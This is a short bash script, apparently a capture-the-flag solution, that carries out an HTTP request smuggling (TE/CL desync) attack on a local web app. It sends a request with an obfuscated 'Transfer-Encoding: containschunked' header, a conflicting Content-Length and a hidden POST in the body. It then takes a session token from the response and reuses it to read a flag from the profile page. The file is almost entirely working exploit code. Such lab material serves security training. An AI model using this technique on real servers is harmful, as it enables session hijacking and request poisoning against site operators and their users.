#!/usr/bin/env bash
set -euo pipefail

s="$(
  curl -s --http1.1 -X GET "http://127.0.0.1:8002/post/2" \
    -H "Host: 127.0.0.1:8002" \
    -H "Transfer-Encoding: containschunked" \
    -H "Content-Length: 4" \
    --data-binary $'7e\r\nPOST /post/transmission HTTP/1.1\r\nHost: 127.0.0.1:8002\r\nContent-Length: 46\r\n\r\npostId=2&name=attacker&transmission=iamgroot\r\n\r\n0\r\n'
)"

c="$(printf '%s' "$s" | tr -d '\r' | grep -oE '[0-9a-f]{32}' | head -n1)"
r="$(
  curl -s --http1.1 "http://127.0.0.1:8002/profile" \
    -H "Host: 127.0.0.1:8002" \
    -H "Cookie: session=$c"
)"

printf '%s' "$r" | tr -d '\r' | sed -E 's/<[^>]*>/ /g' \
  | grep -ioE '(flag|ctf)\{[^}]+\}' | head -n1 \
  || printf '%s' "$r" | tr -d '\r' | sed -E 's/<[^>]*>/ /g' \
    | grep -i -oE 'flag[^A-Za-z0-9]*[A-Za-z0-9_{}-]+' | head -n1 \
    | sed -E 's/^[Ff][Ll][Aa][Gg][^A-Za-z0-9]*//'
